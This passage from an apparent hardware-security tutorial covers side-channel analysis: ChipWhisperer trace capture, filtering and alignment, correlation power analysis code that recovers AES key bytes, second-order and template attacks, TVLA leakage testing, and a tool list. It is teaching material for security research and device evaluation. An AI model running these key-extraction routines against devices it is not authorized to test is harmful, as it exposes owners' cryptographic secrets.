- **Capture sufficient traces:** Start with 1,000; increase if CPA peak is ambiguous
- **Validate trigger consistency:** Check trigger-to-first-sample jitter — even 1 clock cycle of jitter significantly degrades DPA quality

```python
import chipwhisperer as cw
import numpy as np
import os

N_TRACES = 5000
traces = np.zeros((N_TRACES, scope.adc.samples))
plaintexts = np.zeros((N_TRACES, 16), dtype=np.uint8)
ciphertexts = np.zeros((N_TRACES, 16), dtype=np.uint8)

ktp = cw.ktp.Basic()  # Random key/text pairs

for i in range(N_TRACES):
    key, pt = ktp.next()
    
    cw.capture_trace(scope, target, pt, key)
    wave = scope.get_last_trace()
    
    if wave is not None:
        traces[i] = wave
        plaintexts[i] = list(pt)
        # Capture ciphertext from target response
        ciphertexts[i] = list(target.simpleserial_read('r', 16))
    
    if i % 100 == 0:
        print(f"Captured {i}/{N_TRACES}")

np.save('traces.npy', traces)
np.save('plaintexts.npy', plaintexts)
```

---

### Filtering and Signal Processing

Raw power traces contain noise from multiple sources: thermal noise in the measurement path, clock and switching noise from the MCU, and interference from nearby components. Filtering improves DPA success with fewer traces.

#### Low-Pass Filtering

Removes high-frequency noise. The target signal (instruction-level power) is typically at DC to a few × clock frequency; switching noise is at the clock frequency and harmonics.

```python
from scipy.signal import butter, filtfilt
import numpy as np

def lowpass_filter(traces, cutoff_hz, sample_rate_hz, order=4):
    """Apply zero-phase Butterworth low-pass filter to all traces"""
    nyq = sample_rate_hz / 2
    normal_cutoff = cutoff_hz / nyq
    b, a = butter(order, normal_cutoff, btype='low', analog=False)
    return filtfilt(b, a, traces, axis=1)  # axis=1 = filter along sample dimension

# Example: target at 7.37 MHz clock, captured at 100 MSa/s
# Keep signal up to 2× clock frequency; remove high-frequency noise
filtered_traces = lowpass_filter(traces, cutoff_hz=15e6, sample_rate_hz=100e6)
```

#### High-Pass / Band-Pass Filtering

Sometimes the power signal of interest is at a specific frequency band (e.g., for EM traces centered on a carrier frequency):

```python
def bandpass_filter(traces, low_hz, high_hz, sample_rate_hz, order=4):
    nyq = sample_rate_hz / 2
    low = low_hz / nyq
    high = high_hz / nyq
    b, a = butter(order, [low, high], btype='band', analog=False)
    return filtfilt(b, a, traces, axis=1)
```

#### Trace Alignment

Timing jitter between traces (from interrupt latency, cache misses, etc.) shifts the power features horizontally, destroying DPA correlation. Alignment corrects this.

**Sum of Absolute Differences (SAD) alignment:**

```python
def align_traces_sad(traces, reference_trace, search_window=50):
    """Align traces to a reference using SAD minimization"""
    aligned = np.zeros_like(traces)
    ref_len = len(reference_trace)
    
    for i, trace in enumerate(traces):
        best_offset = 0
        best_sad = float('inf')
        
        for offset in range(-search_window, search_window + 1):
            if offset >= 0:
                candidate = trace[offset:offset + ref_len]
                ref_segment = reference_trace[:len(candidate)]
            else:
                candidate = trace[:ref_len + offset]
                ref_segment = reference_trace[-offset:-offset + len(candidate)]
            
            if len(candidate) == 0:
                continue
                
            sad = np.sum(np.abs(candidate - ref_segment))
            if sad < best_sad:
                best_sad = sad
                best_offset = offset
        
        # Apply best offset
        if best_offset >= 0:
            aligned[i, :ref_len - best_offset] = trace[best_offset:ref_len]
        else:
            aligned[i, -best_offset:] = trace[:ref_len + best_offset]
    
    return aligned

# Use the mean of first 50 traces as reference
reference = np.mean(traces[:50], axis=0)
aligned_traces = align_traces_sad(traces, reference, search_window=100)
```

**Cross-correlation alignment** (more robust, slower):

```python
from scipy.signal import correlate

def align_traces_xcorr(traces, reference_trace):
    aligned = np.zeros_like(traces)
    for i, trace in enumerate(traces):
        corr = correlate(trace, reference_trace, mode='full')
        offset = np.argmax(corr) - (len(reference_trace) - 1)
        if offset >= 0:
            aligned[i, :len(trace)-offset] = trace[offset:]
        else:
            aligned[i, -offset:] = trace[:len(trace)+offset]
    return aligned
```

---

### Differential Power Analysis — Leveling Up

#### Correlation Power Analysis (CPA)

CPA (Brier et al., 2004) is the modern standard — more efficient than original DPA's difference-of-means. Uses Pearson correlation coefficient instead of a binary partitioning.

```python
def cpa_attack(traces, plaintexts, byte_idx, poi_start=0, poi_end=None):
    """
    Full CPA attack on one key byte.
    Returns correlation matrix: shape (256, T) where T = sample count.
    """
    if poi_end is None:
        poi_end = traces.shape[1]
    
    N = traces.shape[0]
    T = poi_end - poi_start
    traces_poi = traces[:, poi_start:poi_end]
    
    # Precompute trace statistics
    traces_mean = np.mean(traces_poi, axis=0)
    traces_std = np.std(traces_poi, axis=0) + 1e-10  # avoid div/zero
    
    correlation_matrix = np.zeros((256, T))
    
    for k_guess in range(256):
        # Hypothetical power consumption (Hamming weight of S-box output)
        hw = np.array([
            hamming_weight(SBOX[int(plaintexts[i, byte_idx]) ^ k_guess])
            for i in range(N)
        ])
        
        hw_mean = np.mean(hw)
        hw_std = np.std(hw) + 1e-10
        
        # Pearson correlation at each sample point
        # r = E[(X - μX)(Y - μY)] / (σX * σY)
        centered_hw = hw - hw_mean
        centered_traces = traces_poi - traces_mean
        
        numerator = np.dot(centered_hw, centered_traces) / N
        correlation_matrix[k_guess] = numerator / (hw_std * traces_std)
    
    return correlation_matrix

# Run attack
corr = cpa_attack(aligned_traces, plaintexts, byte_idx=0)

# The most likely key byte: maximum absolute correlation across all samples
max_corr_per_guess = np.max(np.abs(corr), axis=1)
recovered_byte = np.argmax(max_corr_per_guess)
print(f"Recovered key byte 0: 0x{recovered_byte:02X}")
print(f"Correlation: {max_corr_per_guess[recovered_byte]:.4f}")
print(f"Runner-up correlation: {np.sort(max_corr_per_guess)[-2]:.4f}")
```

---

### Visualization

Good visualization is essential — both for identifying the point-of-interest (POI) before attacking and for verifying the result afterward.

#### Trace Overlay Plot

Visualize raw variation across many traces to identify regions of interest:

```python
def plot_trace_overlay(traces, n_show=100, title="Power Traces"):
    fig, (ax1, ax2) = plt.subplots(2, 1, figsize=(16, 8), sharex=True)
    
    # Top: Overlay of individual traces (alpha for density)
    for i in range(min(n_show, len(traces))):
        ax1.plot(traces[i], alpha=0.05, color='blue', linewidth=0.5)
    ax1.plot(np.mean(traces, axis=0), color='red', linewidth=1.5, label='Mean')
    ax1.set_ylabel('Power (ADC units)')
    ax1.set_title(f'{title} — Overlay ({n_show} traces)')
    ax1.legend()
    
    # Bottom: Standard deviation (high std = data-dependent = potential POI)
    ax2.plot(np.std(traces, axis=0), color='orange', linewidth=1)
    ax2.set_xlabel('Sample index')
    ax2.set_ylabel('Std Dev')
    ax2.set_title('Trace Variance (high = potential POI)')
    
    plt.tight_layout()
    plt.show()

plot_trace_overlay(aligned_traces)
```

#### CPA Correlation Map

Visualize all 256 key guesses × all sample points as a heatmap:

```python
def plot_cpa_result(correlation_matrix, true_key_byte=None, byte_idx=0):
    fig, (ax1, ax2) = plt.subplots(2, 1, figsize=(16, 8))
    
    # Heatmap: 256 guesses × T samples
    im = ax1.imshow(
        np.abs(correlation_matrix),
        aspect='auto',
        cmap='hot',
        interpolation='nearest'
    )
    ax1.set_xlabel('Sample index')
    ax1.set_ylabel('Key guess (0x00 – 0xFF)')
    ax1.set_title(f'CPA Correlation Map — Key Byte {byte_idx}')
    plt.colorbar(im, ax=ax1, label='|Pearson r|')
    
    if true_key_byte is not None:
        ax1.axhline(y=true_key_byte, color='cyan', linewidth=1.5, 
                   linestyle='--', label=f'True key: 0x{true_key_byte:02X}')
        ax1.legend()
    
    # Line plot: max correlation per guess
    max_corr = np.max(np.abs(correlation_matrix), axis=1)
    ax2.bar(range(256), max_corr, width=1, color='steelblue', alpha=0.7)
    ax2.set_xlabel('Key guess')
    ax2.set_ylabel('Max |correlation|')
    ax2.set_title('Peak Correlation per Key Guess')
    
    recovered = np.argmax(max_corr)
    ax2.axvline(x=recovered, color='red', linewidth=2, 
               label=f'Recovered: 0x{recovered:02X}')
    if true_key_byte is not None:
        ax2.axvline(x=true_key_byte, color='green', linewidth=2,
                   linestyle='--', label=f'True: 0x{true_key_byte:02X}')
    ax2.legend()
    
    plt.tight_layout()
    plt.show()
    
    return recovered
```

#### Success Rate vs. Trace Count

Plot how many traces are needed to reliably recover the key — a key metric for evaluating a device's resistance:

```python
def plot_success_curve(traces, plaintexts, true_key, byte_idx=0, 
                       step=50, n_trials=10):
    trace_counts = range(step, len(traces) + 1, step)
    success_rates = []
    
    for n in trace_counts:
        successes = 0
        for trial in range(n_trials):
            # Sample n traces randomly
            idx = np.random.choice(len(traces), n, replace=False)
            corr = cpa_attack(traces[idx], plaintexts[idx], byte_idx)
            max_corr = np.max(np.abs(corr), axis=1)
            if np.argmax(max_corr) == true_key[byte_idx]:
                successes += 1
        success_rates.append(successes / n_trials)
    
    plt.figure(figsize=(10, 5))
    plt.plot(trace_counts, success_rates, 'o-', color='steelblue')
    plt.axhline(y=1.0, color='green', linestyle='--', alpha=0.5, label='100% success')
    plt.axhline(y=0.5, color='orange', linestyle='--', alpha=0.5, label='50% success')
    plt.xlabel('Number of traces')
    plt.ylabel('Success rate')
    plt.title(f'CPA Success Rate vs. Trace Count (Key Byte {byte_idx})')
    plt.legend()
    plt.grid(True, alpha=0.3)
    plt.show()
```

---

### Advanced DPA Techniques

#### Second-Order DPA

When first-order masking is present, the secret value is split: `masked_val = secret XOR mask`. Neither value alone correlates with the key. Second-order DPA combines two leakage points:

```python
def second_order_dpa(traces, byte_idx, poi1, poi2):
    """
    Combine two sample points to defeat first-order masking.
    Common combination: absolute difference, product, or mean-center product.
    """
    # Mean-center each point of interest
    t1 = traces[:, poi1] - np.mean(traces[:, poi1])
    t2 = traces[:, poi2] - np.mean(traces[:, poi2])
    
    # Combined trace: product of centered leakages
    combined = t1 * t2
    
    # Now run standard DPA/CPA on the combined value
    return combined
```

Finding the correct POI pair requires either prior knowledge (white-box) of the masking scheme or a brute-force search over POI combinations — computationally expensive but automatable.

#### Template Attacks

Template attacks (Chari et al., 2002) are the most powerful single-trace attacks. They require a training phase (profiling) on a copy of the target device where the key is known, then a matching phase on the actual target.

**Profiling phase (on a clone device):**

```python
from sklearn.discriminant_analysis import LinearDiscriminantAnalysis
from sklearn.preprocessing import StandardScaler

# Collect traces for all 256 possible key byte values
templates = {}
for k in range(256):
    # Collect traces while processing data with known key byte k
    templates[k] = collect_traces_for_key_byte(k, n=1000)

# Reduce dimensionality to principal components or LDA
# Then fit multivariate Gaussian model for each key hypothesis
```

**Matching phase (on target device, key unknown):**

```python
# Collect just 1–10 traces from target
# For each key guess, compute likelihood under the template model
# Maximum likelihood = key guess
```

Template attacks can recover keys from a **single trace** against unprotected implementations — the theoretical optimum for passive side-channel attacks.

#### Leakage Assessment: t-TVLA

Before investing in full CPA, use **Test Vector Leakage Assessment (TVLA)** to determine whether a device leaks at all, and where:

```python
from scipy.stats import ttest_ind

def tvla_assessment(traces_fixed, traces_random):
    """
    Welch's t-test between fixed-key and random-key traces.
    |t| > 4.5 indicates significant leakage at that sample point.
    
    traces_fixed: traces captured with a fixed input
    traces_random: traces captured with random inputs
    """
    t_stats = np.zeros(traces_fixed.shape[1])
    
    for t in range(traces_fixed.shape[1]):
        t_stat, _ = ttest_ind(
            traces_fixed[:, t], 
            traces_random[:, t],
            equal_var=False  # Welch's t-test
        )
        t_stats[t] = t_stat
    
    # Plot with ±4.5 threshold
    plt.figure(figsize=(16, 4))
    plt.plot(t_stats, linewidth=0.5, color='navy')
    plt.axhline(y=4.5, color='red', linestyle='--', label='|t| = 4.5 threshold')
    plt.axhline(y=-4.5, color='red', linestyle='--')
    plt.fill_between(range(len(t_stats)), -4.5, 4.5, alpha=0.1, color='green', 
                     label='No leakage zone')
    plt.xlabel('Sample index')
    plt.ylabel('t-statistic')
    plt.title('TVLA Leakage Assessment')
    plt.legend()
    plt.show()
    
    leakage_points = np.where(np.abs(t_stats) > 4.5)[0]
    print(f"Significant leakage detected at {len(leakage_points)} sample points")
    return t_stats, leakage_points
```

Use TVLA results to:
- Confirm a device leaks before investing in full CPA
- Identify the exact sample indices (POI) where leakage is strongest
- Measure the effectiveness of countermeasures (compare TVLA before/after masking)

---

### Tool Ecosystem Reference

| Tool | Purpose | Cost |
|------|---------|------|
| **ChipWhisperer Lite** | Integrated glitching + power analysis platform | ~$250 |
| **ChipWhisperer Pro** | Higher performance; more glitch options | ~$1,500 |
| **ChipSHOUTER** | EMFI pulse injector | ~$1,000 |
| **JTAGulator** | JTAG/UART pinout discovery | ~$150 |
| **Glasgow Interface Explorer** | FPGA-based; scriptable; multi-protocol | ~$150 |
| **Riscure Inspector** | Commercial SCA/FI analysis suite | $$$$ |
| **SCApy / scared** | Python side-channel analysis libraries | Free/OSS |
| **lascar** | Flexible Python SCA framework (Ledger) | Free/OSS |
| **ChipWhisperer software** | Open-source; Jupyter-based tutorials | Free/OSS |
| **Sigrok / PulseView** | Open-source logic analyzer frontend | Free/OSS |
| **OpenOCD** | Open-source JTAG/SWD debug | Free/OSS |
| **Binwalk** | Firmware extraction and analysis | Free/OSS |
| **Ghidra / IDA Pro** | Firmware reverse engineering | Free / $$$$ |

---

## Further Reading

- *The Hardware Hacker* — Andrew "bunnie" Huang (No Starch Press)
- *Hardware Security: A Hands-on Learning Approach* — Swarup Bhunia, Mark Tehranipoor
- *Power Analysis Attacks: Revealing the Secrets of Smart Cards* — Mangard, Oswald, Popp
- *Fault Analysis in Cryptography* — Joye, Tunstall (eds.)
- ChipWhisperer documentation and Jupyter tutorials: https://chipwhisperer.readthedocs.io
- CHES (Cryptographic Hardware and Embedded Systems) proceedings — annual conference; leading venue for SCA/FI research
- Riscure public training materials
- *Embedded Security CTF challenges* — https://microcorruption.com (MSP430 exploitation)
- *Hack the Machine* talks — DEF CON Hardware Hacking Village proceedings

---

*Document maintained as part of the ULTIMATE-CYBERSECURITY-MASTER-GUIDE. For corrections or contributions, submit a PR to the repository.*
